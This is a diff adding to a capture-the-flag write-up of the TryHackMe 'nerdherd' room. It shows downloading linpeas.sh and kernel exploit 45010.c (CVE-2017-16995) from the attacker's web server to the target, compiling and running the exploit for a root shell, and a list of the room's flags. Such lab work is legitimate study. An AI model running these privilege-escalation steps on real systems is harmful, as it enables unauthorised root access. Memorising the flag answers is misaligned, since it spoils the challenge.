@@ -393,3 +393,399 @@ THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}
 chuck@nerdherd:~$ sudo -l
 [sudo] password for chuck: 
 Sorry, user chuck may not run sudo on nerdherd.
+
+chuck@nerdherd:~$ cat .bash_history
+
+exit
+su
+exit
+su
+exit
+ifconfig 
+clear
+ftp localhost
+clear
+cd /Desk
+cd /home/chuck/Desktop/
+clear
+ftp localhost
+service restart ftp
+service ftpd restart
+why are you looking at my logs????
+su 
+clear
+ftp localhost
+restart
+reboot
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.175.11 - - [02/May/2023 13:05:14] "GET /linpeas.sh HTTP/1.1" 200 -
+
+chuck@nerdherd:/$ cd /tmp
+chuck@nerdherd:/tmp$ ls
+systemd-private-45db4ba770194cb8b773fded38b267e7-colord.service-HUQPlD
+systemd-private-45db4ba770194cb8b773fded38b267e7-rtkit-daemon.service-VPkL2o
+systemd-private-45db4ba770194cb8b773fded38b267e7-systemd-timesyncd.service-TWRoyN
+chuck@nerdherd:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
+--  http://10.8.19.103:1234/linpeas.sh
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 828098 (809K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                  100%[==========================================>] 808,69K   457KB/s    in 1,8s    
+
+(457 KB/s) - ‘linpeas.sh’ saved [828098/828098]
+
+chuck@nerdherd:/tmp$ chmod +x linpeas.sh 
+chuck@nerdherd:/tmp$ ./linpeas.sh 
+
+╔══════════╣ Operative system
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
+Linux version 4.4.0-31-generic (buildd@lgw01-16) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2.1) ) #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016
+Distributor ID:	Ubuntu
+Description:	Ubuntu 16.04.1 LTS
+Release:	16.04
+Codename:	xenial
+
+chuck@nerdherd:/tmp$ uname -a
+Linux nerdherd 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+chuck@nerdherd:/tmp$ cat /etc/issue
+Ubuntu 16.04.1 LTS 
+
+┌──(witty㉿kali)-[~/Downloads/LinEnum]
+└─$ searchsploit Ubuntu 16.04 Local Privilege Escalation
+------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                            |  Path
+------------------------------------------------------------------------------------------ ---------------------------------
+Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                             | linux/local/40054.c
+LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation                 | linux/local/41923.txt
+Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7 | linux_x86-64/local/42275.c
+Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynam | linux_x86/local/42276.c
+Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)           | linux/local/40759.rb
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Esc | linux_x86-64/local/40871.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privil | linux_x86-64/local/40049.c
+Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Pr | windows_x86-64/local/47170.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalat | linux/local/39772.txt
+Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalation    | linux/local/40489.txt
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation             | linux/local/45010.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                    | linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Es | linux_x86-64/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (K | linux/local/43418.c
+Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Pri | linux/local/47169.c
+------------------------------------------------------------------------------------------ ------------------------
+
+┌──(witty㉿kali)-[~/Downloads/LinEnum]
+└─$ searchsploit 45010                                  
+------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                            |  Path
+------------------------------------------------------------------------------------------ ---------------------------------
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation             | linux/local/45010.c
+------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ searchsploit -m 45010
+  Exploit: Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/45010
+     Path: /usr/share/exploitdb/exploits/linux/local/45010.c
+    Codes: CVE-2017-16995
+ Verified: True
+File Type: C source, ASCII text
+Copied to: /home/witty/Downloads/45010.c
+
+chuck@nerdherd:/tmp$ which gcc
+/usr/bin/gcc
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.175.11 - - [02/May/2023 14:14:36] "GET /45010.c HTTP/1.1" 200 -
+
+chuck@nerdherd:/tmp$ wget http://10.8.19.103:1234/45010.c
+--  http://10.8.19.103:1234/45010.c
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 13176 (13K) [text/x-csrc]
+Saving to: ‘45010.c’
+
+45010.c             100%[================>]  12,87K  53,5KB/s    in 0,2s    
+
+(53,5 KB/s) - ‘45010.c’ saved [13176/13176]
+
+chuck@nerdherd:/tmp$ gcc 45010.c -o 45010
+chuck@nerdherd:/tmp$ ./45010
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff88001fa32500
+[*] Leaking sock struct from ffff880019f28000
+[*] Sock->sk_rcvtimeo at offset 472
+[*] Cred structure at ffff88000319fa80
+[*] UID from cred structure: 1000, matches the current: 1000
+[*] hammering cred structure at ffff88000319fa80
+[*] credentials patched, launching shell...
+```
+```text
+# whoami
+root
+```
+```text
+# cd /root
+```
+
+## Privilege Escalation
+```text
+# ls
+root.txt
+```
+```text
+# cat root.txt	
+cmon, wouldnt it be too easy if i place the root flag here?
+```
+```text
+# ls -lah
+total 40K
+drwx------  5 root root 4,0K Kas  5  2020 .
+drwxr-xr-x 24 root root 4,0K Eyl 11  2020 ..
+-rw-r--r--  1 root root 3,1K Kas  5  2020 .bash_history
+-rw-r--r--  1 root root 3,1K Eki 22  2015 .bashrc
+drwx------  2 root root 4,0K Tem 19  2016 .cache
+drwxr-xr-x  2 root root 4,0K Eyl 11  2020 .nano
+-rw-r--r--  1 root root  148 Ağu 17  2015 .profile
+-rw-r--r--  1 root root   62 Eyl 14  2020 root.txt
+drwx------  2 root root 4,0K Eyl 11  2020 .ssh
+-rw-------  1 root root  511 Eyl 11  2020 .viminfo
+```
+```text
+# cat .bash_history               
+passwd
+exit
+nano /etc/sudoers
+exit
+nano /etc/sudoers
+exit
+clear
+nano /etc/sudoers
+exit
+ls -la
+cd /rootls -la
+cat root.txt 
+nano root.txt 
+cd /home/chuck/
+ls -la
+nano user.txt 
+exit
+clear
+cd /var/www/html 
+cd admin/
+ls -la
+cd css
+ls -la
+cd ..
+cd fonts/
+ls -la
+cd font-awesome-4.7.0/
+ls -la
+cd ..
+ls -la
+rm -rf font-awesome-4.7.0/
+ls -la
+cd ..
+rm -rf fonts/
+ls -la
+cd css/
+ls -la
+nano main.css 
+cd /root
+clear
+apt-get install vsftpd
+service vsftpd status
+clear
+sudo adduser anonymous
+nano /etc/vsftpd.conf
+systemctl restart vsftpd
+nano /etc/vsftpd.conf
+systemctl restart vsftpd
+cd /var
+ls -la
+mkdir ftp_home
+useradd ftpuser
+passwd ftpuser
+chown ftpuser:ftpuser /var/ftp_home
+usermod -d /var/ftp_hpme/ ftpuser
+ls -la
+cd ftp_home/
+ls -la
+mkdir test
+usermod -s /sbin/nologin ftpuser
+cat /etc/passwd | grep ftpuser
+systemctl restart vsftpd
+cd ..
+rm -rf ftp_home/
+ls -la
+cp /etc/vsftpd.conf /etc/vsftpd.conf.orig
+sudo ufw status
+ufw allow ftp-data
+ufw allow ftp
+ufw status
+ufw enable
+ufw status
+mkdir -p /var/ftp/pub
+chown nobody:nogroup /var/ftp/pub
+echo "test" | sudo tee /var/ftp/pub/test.txt
+nano /etc/vsftpd
+nano /etc/vsftpd.conf
+systemctl restart vsftpd
+ls -la
+cd ftp/
+ls -la
+cd pub/
+ls -la
+rm test.txt 
+cp /home/chuck/Desktop/youfoundme.png .
+ls -la
+cd ..
+mkdir .jokesonyou
+ls -la
+cd .jokesonyou/
+cd .jokesonyou
+cd ..
+mv .jokesonyou/ pub/
+ls -la
+cd pub/
+ls -la
+cd .jokesonyou/
+touch hellon3rd.txt
+nano hellon3rd.txt 
+clear
+apt install samba
+whereis samba
+mkdir /home/chuck/sambashare
+nano /etc/samba/smb.conf
+service smbd restart
+service apache2 start
+service ssh start
+/etc/init.d/apache2 restart
+/etc/init.d/apache2 start
+systemctl status apache2
+systemctl status ssh
+cd /var/www/html
+ls -la
+mkdir this1sn0tadirect0ry
+ls -la
+cd this1sn0tadirect0ry/
+ls -la
+touch creds.txt
+nano creds.txt 
+cat creds.txt 
+nano creds.txt 
+nano creds.html
+ls -la
+rm creds.html 
+nano creds.txt 
+cd ..
+cd pu
+cd ftp/
+cd pub/
+ls -la
+cp youfoundme.png /home/chuck/Desktop/
+ls -la
+rm youfoundme.png 
+THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}
+mv /home/chuck/Downloads/youfoundme.png .
+rm youfoundme.png 
+mv /home/chuck/Downloads/youfoundme.png .
+clear
+ufw status
+ufw disable
+systemctl restart apache2
+systemctl restart ssh
+smbpasswd -a chuck
+systemctl smb restart
+systemctl samba restart
+systemctl smbx restart
+systemctl smbd restart
+service smbd restart
+ls -la
+mv sambashare/ nerdherd_classified
+nano /etc/samba/smb.conf
+service smbd restart
+ls -la
+service smbd restart
+nano /etc/samba/smb.conf
+service smbd restart
+ufw allow samba
+ls -la
+cd nerdherd_classified/
+touch test
+rm test
+touch secr3t.txt
+nano secr3t.txt 
+
+exit
+cd /root
+cat .bash
+cat .bash_history 
+nano .bash_history 
+exit
+setxkbmap tr
+cd /root
+cat .bash_history 
+ls -la
+cat root.txt 
+clear
+pwd
+rm .bash_history 
+wget http://22.0.97.17/.bash_history
+ls -la
+cat .bash_history 
+exit
+service ftpd restart
+service ftp restart
+cat /etc/init.d/
+ls -la /etc/init.d
+service vsftpd restart
+exit
+cat /root/.bash_
+cat /root/.bash_history 
+clear
+cd ..
+clear
+exit
+```
+```text
+# find / -type f -name "*root.txt*" 2>/dev/null
+/root/root.txt
+/opt/.root.txt
+
+^C
+```
+```text
+# cat /opt/.root.txt
+nOOt nOOt! you've found the real flag, congratz!
+
+THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}
+```
+![[Pasted image 20230502114136.png]]
+User Flag
+Root Flag
+Bonus Flag
+brings back so many memories
+
+## Flags / Answers
+- ***THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}***
+- ***THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}***
+- ***THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}***
+
+## Notes / Lessons Learned
+[[Tardigrade]]
+
